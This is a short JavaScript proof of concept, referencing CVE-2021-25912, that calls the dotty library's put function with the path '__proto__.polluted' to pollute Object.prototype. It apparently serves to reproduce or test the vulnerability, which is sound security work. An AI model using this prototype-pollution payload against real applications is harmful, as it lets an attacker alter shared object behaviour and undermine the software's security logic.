//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25912
  const dotty = require("dotty");
  dotty.put({}, "__proto__.polluted", "yes");
